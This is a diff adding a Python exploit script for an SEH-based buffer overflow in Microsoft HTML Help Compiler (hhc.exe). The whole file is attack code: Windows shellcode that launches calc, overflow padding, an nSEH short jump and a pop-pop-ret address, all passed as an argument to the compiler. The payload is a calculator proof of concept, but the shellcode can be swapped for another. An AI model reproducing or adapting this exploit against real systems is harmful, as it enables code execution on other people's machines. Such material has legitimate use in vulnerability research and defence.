@@ -1,0 +1,52 @@
+#!/usr/bin/env python
+#
+# Exploit Title: Microsoft HTML Help Compiler SEH Based Overflow
+# Date: 2015-08-13
+# Exploit Author: St0rn <st0rn[at]anbu-pentest[dot]com>
+# Twitter: st0rnpentest
+#
+# Vendor Homepage: www.microsoft.com
+# Software Link: http://www.microsoft.com/downloads/details.aspx?FamilyID=00535334-c8a6-452f-9aa0-d597d16580cc&displaylang=en
+# Version: 4.74.8702.0
+# Tested on: Windows 7
+#
+
+from subprocess import Popen
+from struct import pack
+
+
+# 112 bytes All Windows Null-Free CreateProcessA Calc Shellcode
+# We have only 189 bytes after SE Handler
+# https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html
+
+shellcode=""
+shellcode+="\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
+shellcode+="\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
+shellcode+="\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
+shellcode+="\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
+shellcode+="\x57\x78\x01\xc2\x8b\x7a\x20\x01"
+shellcode+="\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
+shellcode+="\x45\x81\x3e\x43\x72\x65\x61\x75"
+shellcode+="\xf2\x81\x7e\x08\x6f\x63\x65\x73"
+shellcode+="\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
+shellcode+="\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
+shellcode+="\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
+shellcode+="\xb1\xff\x53\xe2\xfd\x68\x63\x61"
+shellcode+="\x6c\x63\x89\xe2\x52\x52\x53\x53"
+shellcode+="\x53\x53\x53\x53\x52\x53\xff\xd7"
+
+junk='\x61'*284
+nseh='\xeb\x1e\x90\x90'     # jump 30 bytes
+nop='\x90'*40               # nop
+seh=pack("<I", 0x45312d14)  # pop ecx # pop ecx # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [HHA.dll]
+
+payload=junk+nseh+seh+nop+shellcode
+padding='\x61'*(10000-len(payload))
+
+exploit=payload+padding
+
+try:
+ Popen(["C:\Program Files\HTML Help Workshop\hhc.exe",exploit],shell=False)
+ print "Hack'n'Roll"
+except:
+ print "Cannot run hhc.exe"
